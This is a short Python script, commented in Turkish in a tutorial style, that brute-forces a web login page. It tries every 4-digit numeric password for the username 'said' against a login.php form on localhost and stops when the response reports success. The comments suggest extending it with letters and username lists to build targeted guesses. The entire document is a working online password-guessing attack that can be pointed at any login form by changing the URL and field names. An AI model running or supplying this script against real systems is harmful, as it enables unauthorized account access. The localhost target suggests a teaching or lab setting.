# -*- coding: utf-8 -*-
import itertools  # İterasyon oluşturumamızı sağlayan kütüphane
import requests   # Sayfaya parametre göndererek istek yapmamızı sağlayan kütüphane
import re         # String içinden belirli kelimeleri bulmamızı sağlayan kütüphane

liste = [0,1,2,3,4,5,6,7,8,9] # Kombinasyonları oluştururken baz alacağımız liste
                              # Biz örneği sayılar üzerinden yapacağımız için sayılar listesi oluşturdum
                              # duruma göre harfleride ekleyip hedefe yönelik kombinasyonlar oluşturabilirsiniz

uzunluk = 4 # Parolanın kaç haneli olacağını belirledik

url = "http://localhost:8080/login.php"  # Saldırı yapacağımız URL adresi

kullanici_adi = "said"  # Kullanıcı adı daha önceden biliniyorsa belirlenir
                        # Bilinmiyorsa bir listede kullanıcı adı için belirlenip kombinasyonlar oluşturulmalıdır.


tumKombinasyonlar = itertools.product(liste, repeat=uzunluk) # Olası tüm kombinasyonları belirledik

for i in tumKombinasyonlar: # Olası kombinasyonlar içerisinde döngü oluşturduk
    siradaki = ''.join(map(str,i)) #i yi tuple dan stringe çevirdik
    gonderilecek = dict(kadi = kullanici_adi, sifre = siradaki) # Saldırı yapacağımız sayfadaki kullanıcı adı ve parola
                                                                # texboxlarının 'name' özelliklerine değer atayarak
                                                                # sayfaya gönderilecek bir sözlük oluşturduk
    r = requests.post(url, data=gonderilecek) # url ve sözlüğü parametre olarak vererek  sayfaya istek yaptık    
    if len(re.findall('Basariyla', str(r.content)))>0: # Sayfadan dönen sonucun içerisinde olumlu birşeyler varmı kontrol ettik
        print("[*]Doğru parola : " , siradaki)         # varsa ekrana yazdırdık ve döngüden çıktık
        break
    else: # yoksa kontrol edilen değeri ekrana yazdırdık
        print("[*]"+siradaki," kontrol ediliyor...")
    
    
